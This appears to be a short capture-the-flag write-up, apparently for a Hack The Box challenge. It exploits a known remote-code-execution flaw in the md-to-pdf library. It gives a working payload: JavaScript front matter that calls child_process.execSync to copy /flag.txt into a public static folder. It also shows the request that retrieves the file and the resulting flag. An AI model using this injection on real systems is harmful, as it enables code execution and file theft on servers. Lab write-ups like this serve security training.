Look over code and see it uses md-to-pdf

Google for 'md-to-pdf rce' https://github.com/simonhaenisch/md-to-pdf/issues/99

```
---js
((require(\"child_process\")).execSync(\"cat /flag.txt > /app/static/flag.txt\"))
---
RCE
```

```
GET /static/flag.txt
```
```
HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
```